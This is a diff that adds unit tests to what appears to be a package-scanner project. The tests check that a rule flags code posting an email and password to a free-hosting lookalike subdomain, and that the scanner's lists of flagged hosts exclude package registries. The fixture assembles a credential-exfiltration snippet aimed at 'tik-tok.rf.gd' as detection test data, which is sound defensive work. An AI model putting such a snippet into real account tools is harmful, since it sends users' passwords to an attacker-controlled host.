@@ -1065,3 +1065,66 @@ class TestStagesLeftLooseAtModuleLevel:
     def test_a_build_command_inside_the_tree_is_not(self) -> None:
         source = "import os, subprocess\nos.system('make -C src')\nsubprocess.call(['rm', '-rf', 'build'])\n"
         assert self.found(source) == []
+
+
+class TestAPasswordSentToAFreeHost:
+    """project47 1.0: an account tool sends the email and password it handles to a free-hosting
+    subdomain dressed as the platform. Fixture source assembled at run time."""
+
+    @staticmethod
+    def found(source: str) -> list[str]:
+        return [
+            h.detail
+            for h in PythonAnalyzer.analyse(source)
+            if h.detail.startswith("credentials sent to a free host")
+        ]
+
+    @staticmethod
+    def module(url: str, body: str = "{'email': email, 'pass': password}") -> str:
+        return "\n".join(
+            [
+                "import requests",
+                "def upass(email, password):",
+                f"    requests.post({url!r}, data={body})",
+                "",
+            ]
+        )
+
+    def test_a_password_posted_to_a_free_subdomain(self) -> None:
+        assert self.found(self.module("https://tik-tok." + "rf.gd/save.php")) == [
+            "credentials sent to a free host: requests.post"
+        ]
+
+    def test_a_password_sent_to_the_platform_or_no_password_to_a_free_host_is_not(self) -> None:
+        assert self.found(self.module("https://graph.facebook.com/auth")) == []
+        # A paste site's own login API, and a vendor's backend named for itself (pbwrap,
+        # crucihil, fcsapiaccesssdk in the 16,274).
+        assert self.found(self.module("https://pastebin.com/api/api_login.php")) == []
+        assert self.found(self.module("https://crucihil-server." + "fly.dev/login")) == []
+        assert self.found(self.module("https://tik-tok." + "rf.gd/x", body="{'q': query}")) == []
+
+
+class TestTheHostSetsLeaveTheRegistriesOut:
+    """Every host set a rule flags stays disjoint from the package registries' own hosts."""
+
+    REGISTRIES = frozenset(
+        {"pypi.org", "files.pythonhosted.org", "registry.npmjs.org", "rubygems.org", "crates.io",
+         "proxy.golang.org", "repo1.maven.org", "api.nuget.org", "github.com", "githubusercontent.com"}
+    )  # fmt: skip
+
+    def test_no_registry_host_is_a_free_paste_tunnel_or_interaction_host(self) -> None:
+        from cordon_scanner.analysis.shared.destinations import (
+            FREE_HOSTING,
+            INTERACTION_HOSTS,
+            PASTE_HOSTS,
+            TUNNEL_HOSTS,
+        )
+
+        flagged = FREE_HOSTING | PASTE_HOSTS | TUNNEL_HOSTS | INTERACTION_HOSTS
+        clash = {
+            host
+            for host in flagged
+            for registry in self.REGISTRIES
+            if registry == host or registry.endswith("." + host)
+        }
+        assert not clash
